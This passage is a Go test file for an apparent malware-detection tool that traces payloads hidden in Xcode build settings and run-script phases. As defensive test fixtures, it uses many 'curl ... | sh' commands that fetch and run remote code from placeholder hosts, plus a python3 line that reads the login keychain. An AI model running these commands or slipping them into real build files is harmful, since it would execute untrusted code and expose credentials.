package extract

import (
	"fmt"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
	"github.com/0x4D31/maratus/internal/plistx"
)

func TestXcodeBuildSettingReferenceResolvesInvariantProjectValue(t *testing.T) {
	graph := extractXcodeBuildSettingFixture(t, xcodeBuildSettingObjects(
		`curl https://xcode-setting.example/p | sh`,
		`curl https://xcode-setting.example/p | sh`,
		"", "",
	))

	feature := findXcodeResolvedSettingFeature(t, graph, "PAYLOAD")
	if feature.Support != behavior.SupportCorroborated ||
		feature.Execution.Connectivity != behavior.ConnectivityConnected ||
		feature.Qualifiers["configurations"] != "App/Debug(project),App/Release(project)" {
		t.Fatalf("resolved build-setting feature = %#v", feature)
	}
	assertOperation(t, graph, behavior.OperationNetworkDownload, "network-destination", "https://xcode-setting.example/p")
	if !hasOperationRelationKind(graph.Relations, behavior.RelationPipesTo) {
		t.Fatalf("resolved downloader/interpreter path omitted pipes-to relation: %#v", graph.Relations)
	}
	for _, operation := range graph.Operations {
		if operation.Execution.Connectivity != behavior.ConnectivityConnected ||
			operation.Support != behavior.SupportCorroborated {
			t.Fatalf("resolved operation exceeded support or lost root ownership: %#v", operation)
		}
	}
	if hasPartialCoverageScope(graph.Coverage, "xcode-build-setting-resolution") {
		t.Fatalf("complete invariant resolution was marked partial: %#v", graph.Coverage)
	}
	for _, kind := range []string{
		"xcode-build-setting-declaration",
		"xcode-build-setting-resolution",
	} {
		if !hasEvidenceKind(graph.Evidence, kind) {
			t.Fatalf("resolved setting omitted %s evidence: %#v", kind, graph.Evidence)
		}
	}
}

func TestXcodeBuildSettingTargetValueTakesPrecedence(t *testing.T) {
	graph := extractXcodeBuildSettingFixture(t, xcodeBuildSettingObjects(
		`curl https://project-setting.example/p | sh`,
		`curl https://project-setting.example/p | sh`,
		`curl https://target-setting.example/p | sh`,
		`curl https://target-setting.example/p | sh`,
	))
	assertOperation(t, graph, behavior.OperationNetworkDownload, "network-destination", "https://target-setting.example/p")
	if hasOperationResource(graph.Operations, behavior.OperationNetworkDownload, "https://project-setting.example/p") {
		t.Fatalf("lower-precedence project setting produced behavior: %#v", graph.Operations)
	}
	feature := findXcodeResolvedSettingFeature(t, graph, "PAYLOAD")
	if feature.Qualifiers["configurations"] != "App/Debug(target),App/Release(target)" {
		t.Fatalf("target precedence was not retained: %#v", feature)
	}
}

func TestXcodeBuildSettingRequiresInvariantValueAcrossEveryPhaseOwner(t *testing.T) {
	objects := xcodeBuildSettingObjects(
		`curl https://shared-setting.example/p | sh`,
		`curl https://shared-setting.example/p | sh`,
		"", "",
	)
	objects = strings.Replace(objects, `targets = (TARGET);`, `targets = (TARGET, TARGET_TWO);`, 1)
	objects += `TARGET_TWO = { isa = PBXNativeTarget; name = Helper; buildPhases = (PHASE); buildConfigurationList = TARGET_LIST; };`
	graph := extractXcodeBuildSettingFixture(t, objects)
	feature := findXcodeResolvedSettingFeature(t, graph, "PAYLOAD")
	if feature.Qualifiers["configurations"] !=
		"App/Debug(project),App/Release(project),Helper/Debug(project),Helper/Release(project)" {
		t.Fatalf("phase-owner configuration proof = %#v", feature)
	}
	assertOperation(t, graph, behavior.OperationNetworkDownload, "network-destination", "https://shared-setting.example/p")
}

func TestXcodeBuildSettingRejectsConflictingPhaseOwnerValue(t *testing.T) {
	objects := xcodeBuildSettingObjects(
		`curl https://project-owner.example/p | sh`,
		`curl https://project-owner.example/p | sh`,
		"", "",
	)
	objects = strings.Replace(objects, `targets = (TARGET);`, `targets = (TARGET, TARGET_TWO);`, 1)
	objects += `
		TARGET_TWO = { isa = PBXNativeTarget; name = Helper; buildPhases = (PHASE); buildConfigurationList = TARGET_TWO_LIST; };
		TARGET_TWO_LIST = { isa = XCConfigurationList; buildConfigurations = (TARGET_TWO_DEBUG, TARGET_TWO_RELEASE); };
		TARGET_TWO_DEBUG = { isa = XCBuildConfiguration; name = Debug; buildSettings = { PAYLOAD = "curl https://other-owner.example/p | sh"; }; };
		TARGET_TWO_RELEASE = { isa = XCBuildConfiguration; name = Release; buildSettings = { PAYLOAD = "curl https://other-owner.example/p | sh"; }; };
	`
	graph := extractXcodeBuildSettingFixture(t, objects)
	assertNoXcodeResolvedBehavior(t, graph)
	if !coverageDetailContains(graph.Coverage, "xcode-build-setting-resolution", "differed across target configurations") {
		t.Fatalf("conflicting phase-owner value omitted partial coverage: %#v", graph.Coverage)
	}
}

func TestXcodeBuildSettingDerivedFactsRetainResolutionEvidence(t *testing.T) {
	graph := extractXcodeBuildSettingFixture(t, xcodeBuildSettingObjects(
		`python3 -c 'open("~/Library/Keychains/login.keychain-db").read()'`,
		`python3 -c 'open("~/Library/Keychains/login.keychain-db").read()'`,
		"", "",
	))
	var causalEvidenceIDs []string
	for _, evidence := range graph.Evidence {
		switch evidence.Kind {
		case "xcode-run-script-phase",
			"xcode-build-setting-declaration",
			"xcode-build-setting-resolution":
			causalEvidenceIDs = append(causalEvidenceIDs, evidence.ID)
		}
	}
	if len(causalEvidenceIDs) != 4 {
		t.Fatalf("resolved build setting causal evidence count = %d, want 4: %#v", len(causalEvidenceIDs), graph.Evidence)
	}

	foundPythonFeature := false
	for _, feature := range graph.Features {
		if feature.Key != "script.sensitive_resource" {
			continue
		}
		foundPythonFeature = true
		if feature.Support == behavior.SupportDirect ||
			!containsEveryString(feature.EvidenceIDs, causalEvidenceIDs) {
			t.Fatalf("derived Python feature exceeded support or lost causal evidence: %#v", feature)
		}
	}
	if !foundPythonFeature {
		t.Fatalf("nested Python source produced no scoped Features: %#v", graph.Features)
	}
	if len(graph.Operations) == 0 {
		t.Fatalf("resolved interpreter command produced no operation: %#v", graph)
	}
	for _, operation := range graph.Operations {
		if operation.Support == behavior.SupportDirect ||
			!containsEveryString(operation.EvidenceIDs, causalEvidenceIDs) {
			t.Fatalf("derived operation exceeded support or lost causal evidence: %#v", operation)
		}
	}
	for _, relation := range graph.Relations {
		if relation.Support == behavior.SupportDirect ||
			!containsEveryString(relation.EvidenceIDs, causalEvidenceIDs) {
			t.Fatalf("derived relation exceeded support or lost causal evidence: %#v", relation)
		}
	}
	for _, observation := range graph.Network {
		if observation.Support == behavior.SupportDirect ||
			!containsEveryString(observation.EvidenceIDs, causalEvidenceIDs) {
			t.Fatalf("derived network observation exceeded support or lost causal evidence: %#v", observation)
		}
	}
}

func TestXcodeBuildSettingResolvesAfterCompleteTargetXCConfigAbsenceProof(t *testing.T) {
	objects := xcodeBuildSettingObjectsWithBaseConfigs(
		`curl https://xcconfig-absence.example/p | sh`,
		`curl https://xcconfig-absence.example/p | sh`,
	)
	for _, prefix := range []string{"", "sample.zip!"} {
		t.Run(prefix, func(t *testing.T) {
			project := xcodeProjectContent(objects, "PROJECT")
			project.LogicalPath = prefix + "App.xcodeproj/project.pbxproj"
			contents := []artifact.Content{
				project,
				{NodeID: "node-debug-config", LogicalPath: prefix + "Pods/Debug.xcconfig", Kind: "text", Data: []byte("OTHER = debug\n")},
				{NodeID: "node-release-config", LogicalPath: prefix + "Pods/Release.xcconfig", Kind: "text", Data: []byte("OTHER = release\n")},
			}
			var graph behavior.Graph
			var artifacts artifact.Graph
			ExtractPackageHooks(&graph, project)
			ResolveXcodeBuildSettings(&graph, &artifacts, contents)

			findXcodeResolvedSettingFeature(t, graph, "PAYLOAD")
			assertOperation(t, graph, behavior.OperationNetworkDownload, "network-destination", "https://xcconfig-absence.example/p")
			count := 0
			var absenceEvidenceIDs []string
			var referenceEvidenceIDs []string
			for _, evidence := range graph.Evidence {
				if evidence.Kind == "xcode-build-setting-absence" {
					count++
					absenceEvidenceIDs = append(absenceEvidenceIDs, evidence.ID)
				}
				if evidence.Kind == "xcode-base-configuration-reference" {
					referenceEvidenceIDs = append(referenceEvidenceIDs, evidence.ID)
				}
			}
			if count != 2 {
				t.Fatalf("base-configuration absence evidence count = %d, want 2: %#v", count, graph.Evidence)
			}
			if len(artifacts.Edges) != 2 {
				t.Fatalf("base-configuration relationship count = %d, want 2: %#v", len(artifacts.Edges), artifacts.Edges)
			}
			if len(referenceEvidenceIDs) != 2 {
				t.Fatalf("base-configuration reference evidence count = %d, want 2: %#v", len(referenceEvidenceIDs), graph.Evidence)
			}
			for _, edge := range artifacts.Edges {
				if len(edge.EvidenceIDs) != 2 {
					t.Fatalf("base-configuration relationship lacks two-sided proof: %#v", edge)
				}
			}
			for _, evidenceID := range absenceEvidenceIDs {
				found := false
				for _, edge := range artifacts.Edges {
					if edge.From == project.NodeID && edge.Kind == "xcode-base-configuration" &&
						containsEveryString(edge.EvidenceIDs, []string{evidenceID}) {
						found = true
						break
					}
				}
				if !found {
					t.Fatalf("absence evidence %q lacks a project-to-base-configuration relationship: %#v", evidenceID, artifacts.Edges)
				}
			}
			for _, operation := range graph.Operations {
				if !containsEveryString(operation.EvidenceIDs, absenceEvidenceIDs) {
					t.Fatalf("derived operation lost xcconfig absence evidence: %#v", operation)
				}
			}
		})
	}
}

func TestXcodeBuildSettingFailsClosedOnConfigurationAmbiguity(t *testing.T) {
	tests := []struct {
		name       string
		objects    string
		extra      []artifact.Content
		wantDetail string
	}{
		{
			name: "project values differ",
			objects: xcodeBuildSettingObjects(
				`curl https://debug.example/p | sh`,
				`curl https://release.example/p | sh`,
				"", "",
			),
			wantDetail: "differed across target configurations",
		},
		{
			name: "target values differ",
			objects: xcodeBuildSettingObjects(
				`curl https://project.example/p | sh`,
				`curl https://project.example/p | sh`,
				`curl https://target-debug.example/p | sh`,
				`curl https://target-release.example/p | sh`,
			),
			wantDetail: "differed across target configurations",
		},
		{
			name: "setting missing from one configuration",
			objects: xcodeBuildSettingObjects(
				`curl https://project.example/p | sh`,
				"",
				"", "",
			),
			wantDetail: "absent from an effective target/project configuration",
		},
		{
			name: "nested setting expansion",
			objects: xcodeBuildSettingObjects(
				`echo ${OTHER}`,
				`echo ${OTHER}`,
				"", "",
			),
			wantDetail: "nested Xcode or runtime expansion",
		},
		{
			name: "non scalar setting",
			objects: strings.Replace(
				xcodeBuildSettingObjects(
					`curl https://project.example/p | sh`,
					`curl https://project.example/p | sh`,
					"", "",
				),
				`PAYLOAD = "curl https://project.example/p | sh";`,
				`PAYLOAD = ("curl", "https://project.example/p");`,
				1,
			),
			wantDetail: "non-scalar",
		},
		{
			name: "configuration sets differ",
			objects: strings.Replace(
				xcodeBuildSettingObjects(
					`curl https://project.example/p | sh`,
					`curl https://project.example/p | sh`,
					"", "",
				),
				`TARGET_RELEASE = { isa = XCBuildConfiguration; name = Release;`,
				`TARGET_RELEASE = { isa = XCBuildConfiguration; name = Profile;`,
				1,
			),
			wantDetail: "configuration names did not align",
		},
		{
			name: "target configuration names are duplicated",
			objects: strings.Replace(
				xcodeBuildSettingObjects(
					`curl https://project.example/p | sh`,
					`curl https://project.example/p | sh`,
					"", "",
				),
				`TARGET_RELEASE = { isa = XCBuildConfiguration; name = Release;`,
				`TARGET_RELEASE = { isa = XCBuildConfiguration; name = Debug;`,
				1,
			),
			wantDetail: "target configuration names were duplicated",
		},
		{
			name: "base config assigns key",
			objects: xcodeBuildSettingObjectsWithBaseConfigs(
				`curl https://project.example/p | sh`,
				`curl https://project.example/p | sh`,
			),
			extra: []artifact.Content{
				{NodeID: "node-debug-config", LogicalPath: "Pods/Debug.xcconfig", Data: []byte("PAYLOAD = echo override\n")},
				{NodeID: "node-release-config", LogicalPath: "Pods/Release.xcconfig", Data: []byte("OTHER = release\n")},
			},
			wantDetail: "mentioned the referenced setting",
		},
		{
			name: "base config includes another file",
			objects: xcodeBuildSettingObjectsWithBaseConfigs(
				`curl https://project.example/p | sh`,
				`curl https://project.example/p | sh`,
			),
			extra: []artifact.Content{
				{NodeID: "node-debug-config", LogicalPath: "Pods/Debug.xcconfig", Data: []byte("/* optional */ #  include? \"Shared.xcconfig\"\n")},
				{NodeID: "node-release-config", LogicalPath: "Pods/Release.xcconfig", Data: []byte("OTHER = release\n")},
			},
			wantDetail: "unsupported '#' marker",
		},
		{
			name: "base config uses unsupported preprocessor directive",
			objects: xcodeBuildSettingObjectsWithBaseConfigs(
				`curl https://project.example/p | sh`,
				`curl https://project.example/p | sh`,
			),
			extra: []artifact.Content{
				{NodeID: "node-debug-config", LogicalPath: "Pods/Debug.xcconfig", Data: []byte("#warning unsupported\n")},
				{NodeID: "node-release-config", LogicalPath: "Pods/Release.xcconfig", Data: []byte("OTHER = release\n")},
			},
			wantDetail: "unsupported '#' marker",
		},
		{
			name: "missing base config",
			objects: xcodeBuildSettingObjectsWithBaseConfigs(
				`curl https://project.example/p | sh`,
				`curl https://project.example/p | sh`,
			),
			wantDetail: "absent from the retained artifact",
		},
		{
			name: "conditional project setting",
			objects: xcodeBuildSettingObjects(
				`curl https://project.example/p | sh`,
				`curl https://project.example/p | sh`,
				"", "",
			) + `PROJECT_DEBUG_CONDITIONAL = { isa = XCBuildConfiguration; name = Unused; buildSettings = { "PAYLOAD[sdk=macosx*]" = "echo conditional"; }; };`,
			wantDetail: "",
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			project := xcodeProjectContent(test.objects, "PROJECT")
			project.LogicalPath = "App.xcodeproj/project.pbxproj"
			contents := append([]artifact.Content{project}, test.extra...)
			var graph behavior.Graph
			ExtractPackageHooks(&graph, project)
			ResolveXcodeBuildSettings(&graph, nil, contents)
			if test.name == "conditional project setting" {
				// A conditional key on an unrelated, unlinked configuration is
				// not applicable and must not poison the selected config set.
				findXcodeResolvedSettingFeature(t, graph, "PAYLOAD")
				return
			}
			assertNoXcodeResolvedBehavior(t, graph)
			if !coverageDetailContains(graph.Coverage, "xcode-build-setting-resolution", test.wantDetail) {
				t.Fatalf("coverage omitted %q: %#v", test.wantDetail, graph.Coverage)
			}
		})
	}
}

func TestXcodeBuildSettingRejectsUnsupportedProjectDirPath(t *testing.T) {
	base := xcodeBuildSettingObjects(
		`curl https://project-dir.example/p | sh`,
		`curl https://project-dir.example/p | sh`,
		"", "",
	)
	empty := strings.Replace(
		base,
		`PROJECT = { isa = PBXProject;`,
		`PROJECT = { isa = PBXProject; projectDirPath = "";`,
		1,
	)
	findXcodeResolvedSettingFeature(t, extractXcodeBuildSettingFixture(t, empty), "PAYLOAD")

	for _, test := range []struct {
		name  string
		value string
	}{
		{name: "nonempty", value: "Sources"},
		{name: "malformed", value: "(Sources)"},
	} {
		t.Run(test.name, func(t *testing.T) {
			objects := strings.Replace(
				base,
				`PROJECT = { isa = PBXProject;`,
				`PROJECT = { isa = PBXProject; projectDirPath = `+test.value+`;`,
				1,
			)
			graph := extractXcodeBuildSettingFixture(t, objects)
			assertNoXcodeResolvedBehavior(t, graph)
			if !coverageDetailContains(graph.Coverage, "xcode-build-setting-resolution", "projectDirPath") {
				t.Fatalf("unsupported projectDirPath omitted partial coverage: %#v", graph.Coverage)
			}
		})
	}
}

func TestXcodeBuildSettingRejectsEmptyOrMalformedBaseConfigurationReference(t *testing.T) {
	base := xcodeBuildSettingObjectsWithBaseConfigs(
		`curl https://base-reference.example/p | sh`,
		`curl https://base-reference.example/p | sh`,
	)
	for _, test := range []struct {
		name  string
		value string
	}{
		{name: "empty", value: `""`},
		{name: "whitespace", value: `"   "`},
		{name: "malformed", value: `(DEBUG_CONFIG)`},
	} {
		t.Run(test.name, func(t *testing.T) {
			objects := strings.Replace(
				base,
				`baseConfigurationReference = DEBUG_CONFIG;`,
				`baseConfigurationReference = `+test.value+`;`,
				1,
			)
			project := xcodeProjectContent(objects, "PROJECT")
			contents := []artifact.Content{
				project,
				{NodeID: "node-debug-config", LogicalPath: "Pods/Debug.xcconfig", Data: []byte("OTHER = debug\n")},
				{NodeID: "node-release-config", LogicalPath: "Pods/Release.xcconfig", Data: []byte("OTHER = release\n")},
			}
			var graph behavior.Graph
			ExtractPackageHooks(&graph, project)
			ResolveXcodeBuildSettings(&graph, nil, contents)
			assertNoXcodeResolvedBehavior(t, graph)
			if !coverageDetailContains(graph.Coverage, "xcode-build-setting-resolution", "base configuration reference") {
				t.Fatalf("invalid baseConfigurationReference omitted partial coverage: %#v", graph.Coverage)
			}
		})
	}
}

func TestXcodeBuildSettingRejectsConditionalApplicableSetting(t *testing.T) {
	objects := xcodeBuildSettingObjects(
		`curl https://project.example/p | sh`,
		`curl https://project.example/p | sh`,
		"", "",
	)
	objects = strings.Replace(
		objects,
		`PAYLOAD = "curl https://project.example/p | sh";`,
		`PAYLOAD = "curl https://project.example/p | sh"; "PAYLOAD[sdk=macosx*]" = "echo conditional";`,
		1,
	)
	graph := extractXcodeBuildSettingFixture(t, objects)
	assertNoXcodeResolvedBehavior(t, graph)
	if !coverageDetailContains(graph.Coverage, "xcode-build-setting-resolution", "conditional variant") {
		t.Fatalf("conditional applicable setting omitted partial coverage: %#v", graph.Coverage)
	}
}

func TestXcodeBuildSettingPartialCoverageIdentifiesRunScriptScope(t *testing.T) {
	graph := extractXcodeBuildSettingFixture(t, xcodeBuildSettingObjects(
		`echo debug`,
		`echo release`,
		"", "",
	))
	feature := findXcodeScriptFeature(t, graph)
	want := "run-script scope " + feature.ScopeID + ":"
	if !coverageDetailContains(graph.Coverage, "xcode-build-setting-resolution", want) {
		t.Fatalf("resolution coverage omitted exact run-script scope %q: %#v", want, graph.Coverage)
	}
}

func TestXcodeBuildSettingWrapperGrammarIsClosed(t *testing.T) {
	tests := []string{
		`sh -c '${PAYLOAD}'`,
		`sh -c ${PAYLOAD}`,
		`sh -c "${PAYLOAD:-echo fallback}"`,
		`sh -c "${PAYLOAD}" extra`,
		"sh -c \"${PAYLOAD}\"\necho second",
		`bash -lc "${PAYLOAD}"`,
		`sh --command "${PAYLOAD}"`,
	}
	for _, script := range tests {
		t.Run(strings.ReplaceAll(script, "/", "_"), func(t *testing.T) {
			objects := xcodeBuildSettingObjects(
				`curl https://closed-wrapper.example/p | sh`,
				`curl https://closed-wrapper.example/p | sh`,
				"", "",
			)
			objects = strings.Replace(objects, `shellScript = "sh -c \"${PAYLOAD}\"";`, `shellScript = "`+openStepQuoted(script)+`";`, 1)
			graph := extractXcodeBuildSettingFixture(t, objects)
			if hasXcodeResolvedSettingFeature(graph, "PAYLOAD") ||
				hasOperationResource(graph.Operations, behavior.OperationNetworkDownload, "https://closed-wrapper.example/p") {
				t.Fatalf("unsupported wrapper gained resolved behavior: script=%q graph=%#v", script, graph)
			}
		})
	}
}

func TestXcodeBuildSettingUnusedAndOrphanValuesDoNotGainExecution(t *testing.T) {
	objects := xcodeBuildSettingObjects(
		`curl https://unused-setting.example/p | sh`,
		`curl https://unused-setting.example/p | sh`,
		"", "",
	)
	objects = strings.Replace(objects, `shellScript = "sh -c \"${PAYLOAD}\"";`, `shellScript = "echo safe";`, 1)
	graph := extractXcodeBuildSettingFixture(t, objects)
	if hasXcodeResolvedSettingFeature(graph, "PAYLOAD") ||
		hasOperationResource(graph.Operations, behavior.OperationNetworkDownload, "https://unused-setting.example/p") {
		t.Fatalf("unused setting gained execution: %#v", graph)
	}

	orphan := xcodeBuildSettingObjects(
		`curl https://orphan-setting.example/p | sh`,
		`curl https://orphan-setting.example/p | sh`,
		"", "",
	)
	orphan = strings.Replace(orphan, `buildPhases = (PHASE);`, `buildPhases = ();`, 1)
	graph = extractXcodeBuildSettingFixture(t, orphan)
	if len(graph.ExecutionRoots) != 0 || hasXcodeResolvedSettingFeature(graph, "PAYLOAD") || len(graph.Operations) != 0 {
		t.Fatalf("orphan build-setting wrapper gained execution: %#v", graph)
	}

	for _, shellPath := range []string{"/usr/bin/python3", "/tmp/sh"} {
		unsupportedShell := strings.Replace(
			xcodeBuildSettingObjects(
				`curl https://unsupported-shell.example/p | sh`,
				`curl https://unsupported-shell.example/p | sh`,
				"", "",
			),
			`shellPath = /bin/sh;`,
			`shellPath = `+shellPath+`;`,
			1,
		)
		graph = extractXcodeBuildSettingFixture(t, unsupportedShell)
		assertNoXcodeResolvedBehavior(t, graph)
		if !coverageDetailContains(graph.Coverage, "xcode-project-run-scripts", "unsupported shellPath") {
			t.Fatalf("unsupported shellPath %q omitted partial coverage: %#v", shellPath, graph.Coverage)
		}
	}
}

func TestXcodeBuildSettingValueAndProofCardinalityAreBounded(t *testing.T) {
	oversized := strings.Repeat("a", maxXcodeResolvedSettingBytes+1)
	graph := extractXcodeBuildSettingFixture(t, xcodeBuildSettingObjects(oversized, oversized, "", ""))
	assertNoXcodeResolvedBehavior(t, graph)
	if !coverageDetailContains(graph.Coverage, "xcode-build-setting-resolution", "byte limit") {
		t.Fatalf("oversized setting omitted partial coverage: %#v", graph.Coverage)
	}

	var projectConfigs, targetConfigs, projectIDs, targetIDs strings.Builder
	for index := 0; index < maxXcodeBuildSettingProofs+1; index++ {
		fmt.Fprintf(&projectIDs, "PC%02d,", index)
		fmt.Fprintf(&targetIDs, "TC%02d,", index)
		fmt.Fprintf(&projectConfigs, `PC%02d = { isa = XCBuildConfiguration; name = C%02d; buildSettings = { PAYLOAD = "echo bounded"; }; };`, index, index)
		fmt.Fprintf(&targetConfigs, `TC%02d = { isa = XCBuildConfiguration; name = C%02d; buildSettings = {}; };`, index, index)
	}
	objects := fmt.Sprintf(`
		PROJECT = { isa = PBXProject; targets = (TARGET); buildConfigurationList = PROJECT_LIST; };
		TARGET = { isa = PBXNativeTarget; name = App; buildPhases = (PHASE); buildConfigurationList = TARGET_LIST; };
		PHASE = { isa = PBXShellScriptBuildPhase; shellPath = /bin/sh; shellScript = "sh -c \"${PAYLOAD}\""; };
		PROJECT_LIST = { isa = XCConfigurationList; buildConfigurations = (%s); };
		TARGET_LIST = { isa = XCConfigurationList; buildConfigurations = (%s); };
		%s
		%s
	`, projectIDs.String(), targetIDs.String(), projectConfigs.String(), targetConfigs.String())
	graph = extractXcodeBuildSettingFixture(t, objects)
	assertNoXcodeResolvedBehavior(t, graph)
	if !coverageDetailContains(graph.Coverage, "xcode-build-setting-resolution", "proof count") {
		t.Fatalf("proof-cardinality limit omitted partial coverage: %#v", graph.Coverage)
	}
	if len(graph.Evidence) > 1 {
		t.Fatalf("proof-cardinality failure retained partial proof evidence: %#v", graph.Evidence)
	}

	project := xcodeProjectContent(
		xcodeBuildSettingObjects(`echo bounded`, `echo bounded`, "", ""),
		"PROJECT",
	)
	graph = behavior.Graph{}
	ExtractPackageHooks(&graph, project)
	for index := range graph.Features {
		if graph.Features[index].Key != "xcode.build_phase.shell_script" {
			continue
		}
		graph.Features[index].EvidenceIDs = make([]string, behavior.MaxCausalEvidenceIDs)
		for evidenceIndex := range graph.Features[index].EvidenceIDs {
			graph.Features[index].EvidenceIDs[evidenceIndex] = fmt.Sprintf("ev-causal-%03d", evidenceIndex)
		}
	}
	ResolveXcodeBuildSettings(&graph, nil, []artifact.Content{project})
	assertNoXcodeResolvedBehavior(t, graph)
	if !coverageDetailContains(graph.Coverage, "xcode-build-setting-resolution", "causal evidence count") {
		t.Fatalf("causal-evidence limit omitted partial coverage: %#v", graph.Coverage)
	}
}

func TestXcodeBuildSettingResolutionWorkLimitFailsClosed(t *testing.T) {
	project := xcodeProjectContent(
		xcodeBuildSettingObjects(`echo bounded`, `echo bounded`, "", ""),
		"PROJECT",
	)
	var graph behavior.Graph
	ExtractPackageHooks(&graph, project)
	resolveXcodeBuildSettings(&graph, nil, []artifact.Content{project}, 1)
	assertNoXcodeResolvedBehavior(t, graph)
	if !hasPartialCoverageScope(graph.Coverage, "xcode-build-setting-resolution") {
		t.Fatalf("work limit omitted partial coverage: %#v", graph.Coverage)
	}
}

func TestXcodeBuildSettingResolverDoesNotClaimCoverageWithoutEligibleReference(t *testing.T) {
	for _, graph := range []behavior.Graph{
		{
			Features:           []behavior.Feature{{Key: "package.script", Value: "echo safe"}},
			StringBytesDropped: 1,
		},
		{
			Features: []behavior.Feature{{
				Key:       "xcode.build_phase.shell_script",
				Value:     `sh -c "${PAYLOAD}"`,
				ScopeID:   "scope-orphan",
				Execution: behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
			}},
			StringBytesDropped: 1,
		},
	} {
		ResolveXcodeBuildSettings(&graph, nil, nil)
		if hasPartialCoverageScope(graph.Coverage, "xcode-build-setting-resolution") {
			t.Fatalf("ineligible graph gained Xcode-specific coverage: %#v", graph.Coverage)
		}
	}
}

func TestXcodeBuildSettingAccumulatorEnforcesBoundsBeforeAppend(t *testing.T) {
	accumulator := xcodeBuildSettingAccumulator{
		configurationKeys: map[string]bool{},
		proofKeys:         map[string]bool{},
	}
	for index := 0; index < maxXcodeBuildConfigurations; index++ {
		if reason := accumulator.addConfiguration(fmt.Sprintf("App/C%03d(project)", index)); reason != "" {
			t.Fatalf("configuration %d failed before the bound: %s", index, reason)
		}
	}
	if reason := accumulator.addConfiguration("App/overflow(project)"); !strings.Contains(reason, "configuration count") {
		t.Fatalf("configuration overflow reason = %q", reason)
	}
	if len(accumulator.configurations) != maxXcodeBuildConfigurations {
		t.Fatalf("configuration overflow appended an item: %d", len(accumulator.configurations))
	}

	accumulator = xcodeBuildSettingAccumulator{
		configurationKeys: map[string]bool{},
		proofKeys:         map[string]bool{},
	}
	for index := 0; index < maxXcodeBuildSettingProofs; index++ {
		proof := xcodeBuildSettingProof{kind: "proof", value: fmt.Sprintf("value-%03d", index)}
		if reason := accumulator.addProof(fmt.Sprintf("proof-%03d", index), proof); reason != "" {
			t.Fatalf("proof %d failed before the bound: %s", index, reason)
		}
	}
	if reason := accumulator.addProof("proof-overflow", xcodeBuildSettingProof{kind: "proof", value: "overflow"}); !strings.Contains(reason, "proof count") {
		t.Fatalf("proof overflow reason = %q", reason)
	}
	if len(accumulator.proofs) != maxXcodeBuildSettingProofs {
		t.Fatalf("proof overflow appended an item: %d", len(accumulator.proofs))
	}

	accumulator = xcodeBuildSettingAccumulator{
		configurationKeys: map[string]bool{},
		proofKeys:         map[string]bool{},
	}
	accumulator.configurationBytes = maxXcodeResolvedConfigurationBytes - 1
	if reason := accumulator.addConfiguration("too-long"); !strings.Contains(reason, "configuration labels") {
		t.Fatalf("configuration byte overflow reason = %q", reason)
	}
	if len(accumulator.configurations) != 0 {
		t.Fatalf("configuration byte overflow appended an item: %#v", accumulator.configurations)
	}
	accumulator.proofBytes = maxXcodeBuildSettingProofBytes - 1
	if reason := accumulator.addProof("too-long", xcodeBuildSettingProof{kind: "proof"}); !strings.Contains(reason, "proof data") {
		t.Fatalf("proof byte overflow reason = %q", reason)
	}
	if len(accumulator.proofs) != 0 {
		t.Fatalf("proof byte overflow appended an item: %#v", accumulator.proofs)
	}
}

func TestXcodeBuildSettingConditionalScanChargesDerivedWork(t *testing.T) {
	work := newDerivedWorkBudget(1)
	conditional, reason := xcodeBuildSettingHasConditionalVariant(
		plistx.Dict{"OTHER": "a", "PAYLOAD": "b"},
		"PAYLOAD",
		&work,
	)
	if conditional || !strings.Contains(reason, "work limit") {
		t.Fatalf("conditional scan = (%v, %q), want bounded incomplete result", conditional, reason)
	}
}

func TestXcodeXCConfigAbsenceProofRejectsEveryHashAndHonorsByteBound(t *testing.T) {
	for _, text := range []string{
		`#/**/include "Shared.xcconfig"`,
		`OTHER = value # trailing text`,
		`// a comment containing #`,
	} {
		content := artifact.Content{Data: []byte(text)}
		if reason := xcodeXCConfigProvesSettingAbsent(content, "PAYLOAD"); !strings.Contains(reason, "unsupported '#' marker") {
			t.Fatalf("xcconfig %q absence reason = %q", text, reason)
		}
	}

	atLimit := artifact.Content{Data: []byte(strings.Repeat("x", maxXcodeXCConfigBytes))}
	if reason := xcodeXCConfigProvesSettingAbsent(atLimit, "PAYLOAD"); reason != "" {
		t.Fatalf("xcconfig at byte bound failed: %q", reason)
	}
	overLimit := artifact.Content{Data: []byte(strings.Repeat("x", maxXcodeXCConfigBytes+1))}
	if reason := xcodeXCConfigProvesSettingAbsent(overLimit, "PAYLOAD"); !strings.Contains(reason, "byte inspection limit") {
		t.Fatalf("oversized xcconfig absence reason = %q", reason)
	}
}

func TestXcodeXCConfigAbsenceCacheUsesExactRetainedContentAndSetting(t *testing.T) {
	contents := []artifact.Content{
		{NodeID: "node-duplicate", LogicalPath: "Shared.xcconfig", Data: []byte("OTHER = clean\n")},
		{NodeID: "node-duplicate", LogicalPath: "Shared.xcconfig", Data: []byte("#/**/include \"Other.xcconfig\"\n")},
	}
	index := newXcodeBuildSettingContentIndex(contents)
	candidates := index.byBase["shared.xcconfig"]
	if len(candidates) != 2 {
		t.Fatalf("indexed xcconfig candidates = %d, want 2", len(candidates))
	}
	if reason := index.xcodeXCConfigProvesSettingAbsent(candidates[0], "PAYLOAD"); reason != "" {
		t.Fatalf("clean xcconfig absence reason = %q", reason)
	}
	if reason := index.xcodeXCConfigProvesSettingAbsent(candidates[1], "PAYLOAD"); !strings.Contains(reason, "unsupported '#' marker") {
		t.Fatalf("distinct retained xcconfig reused a clean result: %q", reason)
	}
	if got := len(index.xcconfigAbsence); got != 2 {
		t.Fatalf("xcconfig absence cache entries = %d, want 2 exact identities", got)
	}
	if reason := index.xcodeXCConfigProvesSettingAbsent(candidates[0], "PAYLOAD"); reason != "" {
		t.Fatalf("cached clean xcconfig absence reason = %q", reason)
	}
	if got := len(index.xcconfigAbsence); got != 2 {
		t.Fatalf("repeat lookup grew xcconfig absence cache to %d", got)
	}
	if reason := index.xcodeXCConfigProvesSettingAbsent(candidates[0], "OTHER"); !strings.Contains(reason, "mentioned") {
		t.Fatalf("setting-specific cache lookup reason = %q", reason)
	}
	if got := len(index.xcconfigAbsence); got != 3 {
		t.Fatalf("setting-specific lookup cache entries = %d, want 3", got)
	}
}

func xcodeBuildSettingObjects(projectDebug, projectRelease, targetDebug, targetRelease string) string {
	projectDebugSetting := xcodeSettingDeclaration(projectDebug)
	projectReleaseSetting := xcodeSettingDeclaration(projectRelease)
